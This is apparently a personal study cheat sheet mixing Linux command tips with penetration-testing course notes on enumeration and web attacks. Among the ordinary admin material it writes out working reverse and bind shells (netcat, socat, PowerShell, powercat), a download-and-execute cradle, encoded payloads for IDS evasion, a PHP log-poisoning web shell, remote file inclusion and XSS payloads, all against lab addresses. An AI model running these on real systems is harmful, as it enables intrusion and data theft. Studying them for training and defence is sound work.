# linux-tips + pwk course contents

### `man`
- Keyword search in all man pages: `man -k keyword`
- Search using apropos (equivalent to man -k): `apropos {{keyword}}`

### `mkdir`
- Create several dirs at the same time: `mkdir -p test/{recon,exploit,report}`

### `systemctl`
- `sudo systemctl start ssh`
- Check that service is running: `sudo ss -antlp | grep sshd`
- To start ssh at boot time run: `sudo systemctl enable ssh`
- To start an Apache http server: `sudo systemctl start apache2`
- See all available services: `systemctl list-unit-files`

### `apt` and `dpkg`
- Update packages cache, repositories, versions, descriptions: `apt update`
- To upgrade the system run `apt upgrade`, to upgrade just one package `apt upgrade {{package name}}`
- To search in the internal cache packages db: `apt-cache search {{keyword}}`
- Show package information: `apt show {{package name}}`
- Install with `apt install`
- Completely remove package, including all config files, with `apt remove --purge {{package name}}`
- To install .deb package: `dpkg -i {{route to deb file}}`

### Bash shell
- Display id of the current shell instance: `echo $$`
- Display all env vars: `env`
- Display history with: `history`
- History returns a number for each entry. Run it again with `!{{command number}}`
- Repeat last command with `!!`
- Set `HISTSIZE` to configure the number of commands saved in memory for the current session, and `HISTFILESIZE` to configure the total size of the bash history.

### Piping and redirection
Programs executed from the command line have 3 streams:
- stdin: Program input
- stdout: Program output (default terminal)
- stderr: Errors (default terminal)

Redirections:
- Redirect to new file: `echo "whatever" > newfile.txt`
- Append to existing file: `echo "whatever" >> existing_file.txt"`
- Redirecting stderr: According to POSIX, stdin, stdout and stderr are defined by 0, 1, 2. To redirect the stderr we can append `2>errors.txt` to the command. Also doing `2>/dev/null` is helpful for ignoring errors.

### Text search and manipulation
#### sort
Sort by field 1: ```sort -k1```
Sort desc: ```sort -r```

#### grep
- Grep searches text files for occurrences of regular expressions
- Common flags include `-r` to recursively search, `-i` to ignore case and `-v` to do a reverse grep (exclude matching lines)
- Find subdomains: `grep -o '[^/]*\.site\.com' index.html | sort -u > list.txt`

#### sed
- Sed is an stream editor
- `echo "I love Windows" | sed 's/Windows/GNU\/Linux/'`

#### cut
- Extract sections from a line and send it to stdout
```
echo "pear,apple,banana" | cut -d "," -f 2
apple
```

#### awk
```
echo "hola::friend::amigo" | awk -F "::" '{print $1, $3}'
hola amigo
```

#### comm
```
comm file1.txt file2.txt
```
Displays results in 3 columns:
1) lines just present in file1
2) lines in both files
3) lines just present in file2

Removing lines: ```-{1}{2}{3}``` eg. ```-12``` removes columns 1 and 2.

### vimdiff
Open vim with the diff open in 2 buffers, much clearer than diff or comm in my opinion.

### Background process
The quickest way to background a process is to append an ampersand (&) to the end of the command to send it to the background immediately after it starts.

Other related commands:
- ctrl + z to suspend a process
- `bg` to resume the process suspended in the background
- `fg` returns a process to the foreground
- `jobs` lists all process being executed from the current terminal session
- `fg %{{process_number}}` foregrounds the process with number process_number (processes are listed with their number when running jobs)
- it can also be `fg %{{beginning of the command}}`

### `ps` (process status)
Unlike jobs, it lists processes system-wide.
It also works in powershell, it is an alias to ```Get-Process cmdlet```.

- `ps -ef`: select all processes in full format listing
- `ps -fC {{application name}}`: search by app name (I tried this and it didn't really show the process I was looking for)

### `tail`
Monitor the end portion of a log file with `tail -f`. Get last x lines with `tail -nx`.

### `watch`
Repeat a command each n seconds (2 by default) and continuously watch its output. Watch the execution of the `w` command each 5 seconds:
```watch -n 5 w```

### `wget`
Download with output file name:
```wget -O {{output_file}} {{url}}```

Download just specific file types:
```wget -A '*.pdf -r example.com ```

### `curl`
```
curl -o {{output_file}} {{url}}
```

### `axel`
Download acceleration using several processes (given by the -n flag):
```
axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
```

### `alias`
```
alias alias_name="command"
```
`unalias` unsets an alias.

### `netcat`
- Check if port is open (no dns lookup, verbose): `nc -nv {{ip}} {{port}}`
- Listen: `nc -lvpn {{port}}`
- Receive file: `nc -nlvp 4444 > incoming.exe`
- Send file: `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
- Bind shell (server binds shell): `nc -nlvp 4444 -e cmd.exe`
- Reverse shell (client binds shell): `nc -nv {{ip}} {{port}} -e /bin/bash`

### `socat`
Similar to netcat with some extra features.
- Connect to http server: `socat - TCP4:<remote server's ip address>:80`
- A dash `-` is necessary to trasfer data between a socket and a STDIO
- Listen on a port: `sudo socat TCP4-LISTEN:443 STDOUT`
- Transfer file (http server): `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`. Note that fork creates another thread, this is good for when there is more than one client, either for file uploads or to (reverse) shells.
- Transfer file (http client): `socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
- Reverse shell: 
  - Server (attacker): `socat -d -d TCP4-LISTEN:443 STDOUT`. `-d` just increases verbosity.
  - Client (target): `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
- Create self-signed certificate to add encryption to the connection:
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
- Bind shell securely:
```
sudo socat OPENSSL-LISTEN:4433,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Connect to server:
```
socat - OPENSSL:10.11.0.4:443,verify=0
```

### Powershell
To set unrestricted policy:
```
Set-ExecutionPolicy Unrestricted
```

Download file:
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

#### Reverse shell
Listener/Server/Attacker: `sudo nc -lnvp 443`

Client/Victim:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
```

#### Bind shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',4445);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### `powercat`
Powershell version of netcat.
Install in Kali: `apt install powercat`.

The installation process places the script `powercat.ps1` at `/usr/share/windows-resources/powercat`. Copy the script to the Windows machine, and then run it from powershell in this way: `. .\powercat.ps1`. This makes variables and functions defined in the script accessible to the PS console. From here the command `powercat` is available.

Tip: It is also possible to download the powercat script and run it using`iex`: ```iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```

#### Send file
```
powercat -c 10.0.2.15 -p 4445 -i /path/to/file/to/send
```

#### Reverse shell
```
 powercat -c 10.0.2.15 -p 4445 -e cmd.exe
```

`-l` is for listening and perform all the opposite actions :)

#### Generation of powershell payloads
Use `-g` to generate the powershell payload:
```
powercat -c 10.0.2.15 -p 4445 -e cmd.exe -g > connect.ps1
```

When executed from powershell, the script will connect to the attacker and bind a shell. The problem with this type of payload generation is that any intrusion detection system (IDS) would detect it.

Use `-ge` to generate a base64 encoded payload instead:
```
powercat -c 10.0.2.15 -p 4445 -e cmd.exe -ge > connect_base64.ps1
```

Then execute it passing directly the encoded string to powershell using the -E flag:
```
powershell -E {{paste the base64 encoded payload}}
```

### `tcpdump`
- Open existing capture file: `sudo tcpdump -r password_cracking_filtered.pcap`
- Filtering traffic:
  - Get ip + port ($3), order them and count how many time each combination appears in the file:
```
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3 }' | sort | uniq -c | head
```
  - Tcpdump also includes filters:
    - `tcpdump src host {{source host}}`
    - `tcpdump dst host {{destination host}}`
    - `tcpdump port {{port}}`
- Dump packet contents in hexa and ascii by adding `-X`
- To get tcp packets that have ACK + PSH (data packets) add: `'tcp[13] = 24'`

### `bash`
- Start scripts with `!#/bin/bash`. `!#` is called she-bang.
- Declare variable: `hello=holaaa`
- Reference variable: `echo $hello`
- Quoting strings:
  - Single quotes: `'hola'`. Bash treats all characters as literals.
  - Double quotes: `"hola"`. All characters exepting `$` and `\` are treated as literals:
- Save the result of a command in a variable:
  - `result=$(whoami)` (preferred option)
  - ``` result=`whoami` ```
- Add `#!/bin/bash -x` to print the code being executed also and not just its output.
- Read user input to variable using read: `read response; echo $response`
- To specify prompt: `read -p 'Username: ' username`. To make user input invisible add `-s`
- Combine commands outputs:
```
{
c1
c2
c3
} | othercommand
```
- Conditions:
```
if [ <some test> ]
then
  <perform an action> 
fi
```
<img src="https://i.imgur.com/E17rdBa.png" alt="drawing" width="500"/>

- Use `&&` to execute a command just if the last command was successful and `||` if it failed.
```
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found !"
```
Note they are also the `and` and `or` logical operators.
- For general structure:
```
for var-name in <list>
do
<action to perform>
done
```
  - Loop one-liners examples:
    - `for ip in $(seq 1 10); do echo 10.11.1.$ip; done`
    - `for ip in {1..10}; do echo 10.11.1.$ip; done`
- While structure:
```
while [ <some test> ]
do
<perform an action>
done
```
- Function:
```
function function_name {
  commands...
}
```
or
```
function_name () {
  commands...
}
```
- Passing args:
```
pass_arg() {
  echo "Today's random number is: $1"
}
pass_arg $RANDOM
```
- Local variables: `local name="Joe"`
- Iterate over file lines:
```
for url in $(cat list.txt); do host $url; done
```
- Get capture of site: `cutycapt --url=$ip --out=$ip.png`

### OSINT
- Check page for contacts -> verify social media
- `whois {{domain name}}`

#### Google
- `site:{{site}}`
- `filetype:{{filetype eg php}}`
- Exclude filetype: `-filetype:php`
- `intitle:"index of"`
- https://www.exploit-db.com/google-hacking-database

#### [Netcraft](https://netcraft.com)
- Search for dns information at https://searchdns.netcraft.com
- Check report for getting detailed information about the server
- The report also has a "Site Technology" section that lists technologies of the server

#### recon-ng
- Search available modules: `marketplace search {{keyword | leave empty to list all}}`
  - Note the columns D (has dependencies) and K (requires keys). See info of module for details.
- Get module info: `marketplace info {{module path}}
- Install module: `marketplace install {{module path}}`
- Load module: `modules load {{module path}}`
- Get info after loading module (including variables to set): `info`
- Set option: `options set {{option}} {{value}}`
- Run: `run`
- Unload module: `back`
- Show what was obtained so far: `show`
- Resolve hosts IPs: `recon/hosts-hosts/resolve`
- For github modules, generate token at https://github.com/settings/tokens. Then add it using `key add github_api {{key}}`

#### Open Source
Tools:
- [Gitrob](https://github.com/michenriksen/gitrob): Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files. The findings will be presented through a web interface for easy browsing and analysis.
  - Example: `GITROB_ACCESS_TOKEN={{yourtoken}} ./gitrob {{username}}`
  - Install by downloading the binary, it didn't work for me in any other way.
- [Gitleaks](https://github.com/zricethezav/gitleaks): Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
`gitleaks -r {{repository}}`

#### Shodan
Search `hostname:{{domain}}`

#### Headers scan
Search site on `https://securityheaders.com` to analyze headers.

#### SSL verifications
Search site on `https://www.ssllabs.com/ssltest/` to analyze SSL security.

#### Pastebin
Search for domain names on pastebin, or anything else.

#### `theharvester`
`theHarvester -d {{domain}} -b {{source of info e.g. google}}`

#### Social-Searcher
Web that need will find results in social media about the domain.

#### Twofi
Analyzes a Twitter user's feed to generate a personalized wordlist. Requires Twitter API key.

#### linkedin2username
Generates usernames based on Linkedin data.

#### OSINT Framework
List of tools/techniques to get open source information.
https://osintframework.com/

#### Maltego

### Active information gathering - DNS
#### Types of DNS records
- NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain
- A: Also known as a host record, the a record contains the IP address of a hostname (such as www.duckduckgo.com)
- MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain
- PTR: Pointer Records are used in reverse lookup zones and are used to find the records associated with an IP address
- CNAME: Canonical Name Records are used to create aliases for other host records
- TXT: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification

##### `host`
By default it gets an A and a MX records:
```
$ host duckduckgo.com
duckduckgo.com has address 191.235.123.80
host twtittduckduckgo.com mail is handled by 0 duckduckgo-com.mail.protection.outlook.com.
```

Get other types of records using the -t parameter:
```
$ host -t MX duckduckgo.com
duckduckgo.com mail is handled by 0 duckduckgo-com.mail.protection.outlook.com.

$ host -t TXT duckduckgo.com
duckduckgo.com descriptive text "ZOOM_verify_QSjXtfOfRHiY0O9gD5E4Ug"
duckduckgo.com descriptive text "MS=ms71454350"
duckduckgo.com descriptive text "v=spf1 include:mailer.duckduckgo.com include:amazonses.com include:spf.protection.outlook.com -all"

$ host -t CNAME duckduckgo.com
duckduckgo.com has no CNAME record

$ host -t PTR duckduckgo.com
duckduckgo.com has no PTR record

$ host -t NS duckduckgo.com
duckduckgo.com name server ns04.quack-dns.com.
duckduckgo.com name server dns4.p05.nsone.net.
duckduckgo.com name server dns3.p05.nsone.net.
duckduckgo.com name server ns02.quack-dns.com.
duckduckgo.com name server dns1.p05.nsone.net.
duckduckgo.com name server ns01.quack-dns.com.
duckduckgo.com name server ns03.quack-dns.com.
duckduckgo.com name server dns2.p05.nsone.net.
```

Passing "any" as type will fetch any record type:
```
$ host -t any duckduckgo.com
duckduckgo.com host information "RFC8482" ""
duckduckgo.com has address 191.235.123.80
duckduckgo.com name server ns03.quack-dns.com.
duckduckgo.com name server dns3.p05.nsone.net.
duckduckgo.com name server dns2.p05.nsone.net.
duckduckgo.com name server dns4.p05.nsone.net.
duckduckgo.com name server ns01.quack-dns.com.
duckduckgo.com name server ns04.quack-dns.com.
duckduckgo.com name server ns02.quack-dns.com.
duckduckgo.com name server dns1.p05.nsone.net.
```

###### Forward lookup bruteforce
Forward lookup means that we get DNS information from a host name. Bruteforcing it would mean to try several subdomains to determine if they exist or not:
```
for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```

###### Reverse lookup bruteforce
Once an IP address is found for a domain, it may be useful to try IPs in the same range:
```
for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
```

#### DNS zone transfers
The DNS is broken up into many different zones. These zones differentiate between distinctly managed areas in the DNS namespace. A DNS zone is a portion of the DNS namespace that is managed by a specific organization or administrator. A zone transfer is basically a database replication between related DNS servers in which the zone file is copied from a master DNS server to a slave server. The zone file contains a list of all the DNS names configured for that zone. Zone transfers should only be allowed to authorized slave DNS servers but many administrators misconfigure their DNS servers, and in these cases, anyone asking for a copy of the DNS server zone will usually receive one.
```
host -l {{domain name}} {{dns server address}}
```

Check all zone transfers for a domain (linkedin.com in this example):
```
host -t NS site.com | awk -F" " '{ print $4 }' | xargs -I{} host -l site.com {} | grep "has address"
```

##### `dnsrecon`
Zone transfers with dnsrecon:
```
dnsrecon -d site.com -t axfr
```

Forward lookup bruteforce:
```
dnsrecon -d site.com -D ~/list.txt -t brt
```

#### Port scanning
##### Netcat
Netcat TCP port scanning:
```
nc -nvv -w 1 -z 10.11.1.220 3388-3390
```
-w specifies the connection timeout in seconds and -z indicates a zero-I/O mode (not sending any information but just creating the connection.

Netcat UDP port scanning:
```
nc -nvv -w 1 -z -u 10.11.1.115 160-162
```
##### Nmap
###### Stealth/SYN scan (-sS)
- The default scan type in nmap is the stealth/syn scan.
- It does not complete the TCP handshake as it just sends a SYN packet and waits for the SYN-ACK from the server.
- Requests using this type of scan would not appear in application logs but a firewall definitely registers it nowadays.

###### TCP connect scan (-sT)
- The TCP connect scan completes a TCP handshake to check if a port is open or not.
- It uses the Berkeley sockets API.
- It takes longer to complete than a SYN scan.

###### UDP scan (-sU with sudo)
2 different methods are combined to do a UDP scan:
- For well-known ports, the port scanner will send a protocol-specific packet.
- For the rest, an empty UDP packet is sent to a specific port. If the destination UDP port is open, the packet will be passed to the application layer and the response received will depend on how the application is programmed to respond to empty packets. However, if the destination UDP port is closed, the target responds with an ICMP port unreachable.

###### TCP & UDP
TCP and UDP scans can be executed together adding -sS and -sT flags.

###### Network sweeping
It consists of probing servers using ICMP echo requests but also trying other probing methods such us sending a TCP SYN packet to port 443, a TCP ACK packet to port 80, and an ICMP timestamp request to verify if a host is available or not.

###### NSE scripts
NSE scripts are located at `/usr/share/nmap/scripts`
To execute one specific script add --script=script_name. E.g. to execute a dns zone transfer:
```
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```
Get information about a specific script:
```
 nmap --script-help dns-zone-transfer
```

The file `/usr/share/nmap/scripts/script.db` contains all the scripts with their categories (vuln, discovery, etc)

###### Other flags:
--top-ports=20 for top 20 ports. Check the list of all ports and their frequency calculate the top ones here: `/usr/share/nmap/nmap-services`
-O for OS fingerprinting
-sV for version detection (through banner grabbing)

##### SMB enumeration
Server Message Block (SMB) runs on the port 445. At the same time, NetBIOS which is a session layer protocol that runs on port 139 that allows computers communicate is used by SMB. Nmap scan of them:
```
 nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
```

Also use the more specific tool to get info about NetBIOS: `nbtscan`:
```
sudo nbtscan -r 10.11.1.0/24
```

##### Network File System (NFS)
NFS is a distributed file system protocol originally developed by Sun Microsystems in 1984. It allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage. It's quite difficult to set it up securely so it's common it has vulnerabilities.

Both **Portmapper** and **RPCbind** run on TCP port 111. Requests to NFS goes through these services so it's a good idea to scan for them first:
```
nmap -v -p 111 10.11.1.1-254
```

We can also use the rpcinfo nse script to scan for what rpc services are running on a system and on what port they run.
```
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```

We can also run all the NFS scripts using a wildcard:
```
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72 ...
Nmap scan report for 10.11.1.72
PORT STATE SERVICE
111/tcp open rpcbind
| nfs-showmount:
|_ /home 10.11.0.0/255.255.0.0
```

As the whole /home directory is shared, it is possible to mount it from our computer:
```
sudo mount -o nolock 10.11.1.72:/home ~/home/
```
The `-o nolock` (disabling file locking) is generally needed for older nfs servers.

It may happen that certain files are just allowed to be accessed by a certain user/group, and these permisions are kept when mounting the remote folder. In the next log it's clear that the file `creds.txt`
```
kali@kali:~/home$ cd marcus
kali@kali:~/home/marcus$ ls -la
total 24
drwxr-xr-x 2 1014 1014 4096 Jun 10 09:16 .
drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
kali@kali:~/home/marcus$ cat creds.txt cat: creds.txt: Permission denied
```

We can then create a user with that id on our computer et voila:
```
sudo adduser pwn
```
If the new user has id 1001, we change it to 1014 in /etc/password:
```
sudo sed -i -e 's/1001/1014/g' /etc/passwd
```

#### SMTP enumeration
The Simple Mail Transport Protocol supports several interesting commands, such as VRFY and EXPN. A VRFY request asks the server to verify an email address, while EXPN asks the server for the membership of a mailing list.

```
kali@kali:~$ nc -nv 10.11.1.217 25
(UNKNOWN) [10.11.1.217] 25 (smtp) open
220 hotline.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
```

#### SNMP enumeration
Over the years, we have often found that the Simple Network Management Protocol (SNMP) is not well-understood by many network administrators. This often results in SNMP misconfigurations, which can result in significant information leakage.

Issues:
- It is based on UDP which is stateless and therefore is susceptible to IP spoofing and replay attacks.
- SNMP protocols 1, 2, and 2c offer no traffic encryption.
- Traditional SNMP protocols also have weak authentication schemes and are commonly left configured with default public and private community strings.

##### The SNMP MIB Tree
The SNMP Management Information Base (MIB) is a database containing information usually related to network management. It has OIDs of resources that can be monitored.

Scan for SNMP:
```
sudo nmap -sU --open -p 161 10.11.1.1-254
```

Using **onesixtyone** we can scan a SNMP server:
```
echo public > community
echo private >> community
echo manager >> community
onesixtyone -c community -i ips
```

Once we find SNMP services, we can start querying them for specific MIB data that might be interesting.

##### Windows SNMP enumeration example
Scan with snmpwalk using `-c` to set public as the community string, `-v1` to specify snmp version to 1, and `-t` to set timeout perioud to 10 sec.
```
snmpwalk -c public -v1 -t 10 10.11.1.14
```

Enumerate Windows users:
```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
```

Enumerate running processes:
```
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
```

Enumerate open tcp ports:
```
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
```

Enumerate installed software:
```
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

### Web Applications Assessment
Tips:
- Check "Server" response header to get used web server
- Headers starting by "X-" are non-standard HTTP headers
- In Firefox's debugger tab, when checking a JS source file, press the curly brackets to expand code (if it's minified)
- Use dirb, nikto

### XSS (Cross-site scripting)
XSS happens when unsanitized input is displayed on a web page.

3 types:
- Stored/Persistent: The exploit payload is stored in a database or otherwise cached by a server. The web application retrieves this payload and displays it to anyone that views a vulnerable page. Ofter found on forums technologies or reviews pages.
- Reflected: It includes the payload in a crafted request or link. This variant only attacks the person submitting the request or viewing the link. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.
- DOM-based: This variant occurs when a page’s DOM is modified with user-controlled values. DOM-based XSS can be stored or reflected. The key difference is that DOM-based XSS attacks occur when a browser parses the page’s content and inserted JavaScript is executed.

We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitized input which is displayed as output in subsequent pages.

Related encoding:
- URL encoding: percentage encoding, useful for including non-ascii characters in URLs
- HTML encoding: encode/escape characters that generally have special meaning in HTML

We may need different sets of characters depending on where our input is being included. For example, if our input is being added between div tags, we will need to include our own script tags265 and will need to be able to inject “<” and “>” as part of the payload. If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.

Basic XSS: `<script>alert('hola')</script>`
Content injection that provokes redirects: `<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>`

#### Stealing cookies
Cookies flags related to security: Secure (only send over encrypted connections) and HttpOnly (don't make it available to JS).

### Directory/path traversal
Most common indicator of vulnerability: file extensions in URL query strings. Then try to access other files.

### File inclusion vulnerabilities
Including a file into the application's running code. Local file inclusions (LFI) occur when the included file is loaded from the same web server. Remote file inclusions (RFI) occur when a file is loaded from an external source.

Logs file LFI example: if you are able to include any local file, and you know where the log file is, just send a request to the server that includes the php script.

On the app side:
```
<?php
 $file = $_GET["file"]; 39 include $file; ?>
```

The request to poison log file:
```
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

Then exploit it. It seems that if the file contains some php inside it's already enough for php to run it (because the log has other garbage):
```
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

### Remote file inclusion
Same as LFI but the referenced file is a remote one. Loading external files like this isn't generally not allowed though. But it makes it easier:
```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```

File inclusion tricks:
- Older versions of PHP have a vulnerability in which a null byte278 (%00) will terminate any string. This trick can be used to bypass file extensions added server-side and is useful for file inclusions because it prevents the file extension from being considered as part of the string. 
- End the file extension with a them with a question mark (?) to mark anything added to the URL server-side as part of the query string.

### Web server one-liners
```
python -m SimpleHTTPServer 7331]
python3 -m http.server 7331
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```
